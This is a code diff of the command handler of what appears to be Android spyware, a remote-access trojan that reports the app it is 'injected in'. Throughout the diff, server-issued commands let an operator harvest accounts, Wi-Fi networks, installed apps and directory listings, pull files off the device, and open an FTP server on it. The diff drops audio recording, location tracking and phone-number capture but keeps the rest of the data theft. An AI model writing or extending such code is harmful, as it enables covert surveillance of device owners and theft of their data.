@@ -22,33 +22,28 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
+import java.util.Locale;
 
 public class SafeCommands {
 
     private Context context;
-    private SafeAudio audio;
     private SafeCommunications comms;
     private SafeLogger logger;
-    private SafeLocations locs;
     private SafeFTPServer ftpServer;
     private String simpleId;
 
     // TODO make key value pair
     private static final String[] COMMANDS = {
-            "respond", "location start", "location stop", "location single",
-            "audio start", "audio stop", "toast ", "dialog ", "wifi",
-            "accounts", "phone number", "ls ", "download ", "commands",
-            "version", "infected", "address", "timeout ", "status", "getlog",
-            "ftp start", "ftp stop", "apps", "downlast "};
+            "respond" , "toast "  , "dialog "  , "wifi"    ,
+            "accounts", "ls "     , "download ", "commands",
+            "version" , "infected",  "status"  , "ftp start",
+            "ftp stop", "apps"    , "downlast "};
 
 
-    public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger,
-                        SafeLocations locs, SafeAudio audio, SafeFTPServer ftpServer, String simpleId) {
+    public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger, SafeFTPServer ftpServer, String simpleId) {
         this.context = context;
         this.comms = comms;
         this.logger = logger;
-        this.locs = locs;
-        this.audio = audio;
         this.ftpServer = ftpServer;
         this.simpleId = simpleId;
     }
@@ -58,49 +53,31 @@ public class SafeCommands {
         logger.write(fromServer);
         if (fromServer.equalsIgnoreCase(COMMANDS[0])) {
             comms.say("Responding");
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[1])) {
-            locs.startLocations();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[2])) {
-            locs.stopLocations();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[3])) {
-            locs.getSingleLocation();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[4])) {
-            audio.startRecording();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[5])) {
-            audio.stopRecording();
-        } else if (fromServer.startsWith(COMMANDS[6])) {
+        } else if (fromServer.startsWith(COMMANDS[1])) {
             toast(fromServer);
-        } else if (fromServer.startsWith(COMMANDS[7])) {
+        } else if (fromServer.startsWith(COMMANDS[2])) {
             dialog(fromServer);
-        } else if (fromServer.startsWith(COMMANDS[8])) {
+        } else if (fromServer.startsWith(COMMANDS[3])) {
             getWiFiNetworks();
-        } else if (fromServer.startsWith(COMMANDS[9])) {
+        } else if (fromServer.startsWith(COMMANDS[4])) {
             getAccounts();
-        } else if (fromServer.startsWith(COMMANDS[10])) {
-            getPhoneNumber();
-        } else if (fromServer.startsWith(COMMANDS[11])) {
-            listDir(fromServer.substring(COMMANDS[11].length(), fromServer.length()));
-        } else if (fromServer.startsWith(COMMANDS[12])) {
-            comms.download(fromServer.substring(COMMANDS[12].length(), fromServer.length()));
-        } else if (fromServer.startsWith(COMMANDS[13])) {
+        } else if (fromServer.startsWith(COMMANDS[5])) {
+            listDir(fromServer.substring(COMMANDS[5].length(), fromServer.length()));
+        } else if (fromServer.startsWith(COMMANDS[6])) {
+            comms.download(fromServer.substring(COMMANDS[6].length(), fromServer.length()));
+        } else if (fromServer.startsWith(COMMANDS[7])) {
             for (String command : COMMANDS) {
                 comms.say(command);
             }
-        } else if (fromServer.startsWith(COMMANDS[14])) {
+        } else if (fromServer.startsWith(COMMANDS[8])) {
             comms.say("Version: " + SafeService.VERSION);
-        } else if (fromServer.startsWith(COMMANDS[15])) {
+        } else if (fromServer.startsWith(COMMANDS[9])) {
             comms.say("Injected in: " + context.getApplicationContext().getPackageName());
-        } else if (fromServer.startsWith(COMMANDS[16])) {
-            comms.say(locs.getLastKnownAddress());
-        } else if (fromServer.startsWith(COMMANDS[17])) {
-            SafeService.setSoTimeOut(fromServer.substring(COMMANDS[17].length(), fromServer.length()));
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[18])) {
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[10])) {
             sayStatus();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[19])) {
-            comms.upload(logger.logfile());
-        } else if (fromServer.startsWith(COMMANDS[20])) {
+        } else if (fromServer.startsWith(COMMANDS[11])) {
             try {
-                String stringPort = fromServer.substring(COMMANDS[20].length() + 1, fromServer.length());
+                String stringPort = fromServer.substring(COMMANDS[11].length() + 1, fromServer.length());
                 try {
                     int port = Integer.parseInt(stringPort);
                     ftpServer.startServer(port);
@@ -110,29 +87,29 @@ public class SafeCommands {
             } catch (StringIndexOutOfBoundsException e) {
                 comms.say("Not a valid command, need \"ftp start port_num\"");
             }
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[21])) {
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[12])) {
             ftpServer.stopServer();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[22])) {
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[13])) {
             installedApps();
-        } else if (fromServer.startsWith(COMMANDS[23])) {
-            String[] commands = fromServer
-                    .substring(COMMANDS[23].length(), fromServer.length())
+        } else if (fromServer.startsWith(COMMANDS[14])) {
+            String[] args = fromServer
+                    .substring(COMMANDS[14].length(), fromServer.length())
                     .split("\\s*,\\s*");
             int amount;
             // Check if we have the correct amount of args
-            if(commands.length != 2){
+            if(args.length != 2){
                 comms.say("Need: \'downlast ##, /directory/location\'");
                 return;
             }
             // Everything fine, try to parse the amount of files to download
             try {
-                amount = Integer.parseInt(commands[0]);
+                amount = Integer.parseInt(args[0]);
             } catch (NumberFormatException e) {
                 comms.say("Cant parseInt. Need: \'downlast ##, /directory/location\'");
                 return;
             }
             // Everything fine, download last files based on creation date.
-            comms.downloadLast(amount, commands[1]);
+            comms.downloadLast(amount, args[1]);
         }
     }
 
@@ -176,11 +153,6 @@ public class SafeCommands {
         } else {
             return "no accounts found";
         }
-    }
-
-    private void getPhoneNumber() {
-        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        comms.say("" + tMgr.getLine1Number());
     }
 
     // use AsyncTask to give some work out of hands to run toast on UI thread
@@ -250,11 +222,9 @@ public class SafeCommands {
         sb.append("\r\n");
         sb.append("account[0]      = " + getFirstAccount());
         sb.append("\r\n");
+        sb.append("language        = " + Locale.getDefault().getDisplayLanguage());
+        sb.append("\r\n");
         sb.append("wifi status     = " + ssid);
-        sb.append("\r\n");
-        sb.append("recording audio = " + SafeService.isbAudioStarted());
-        sb.append("\r\n");
-        sb.append("location track  = " + SafeService.isbLocationStarted());
         sb.append("\r\n");
         sb.append("infected app    = " + context.getApplicationContext().getPackageName() + " v" + SafeService.VERSION);
         sb.append("\r\n");
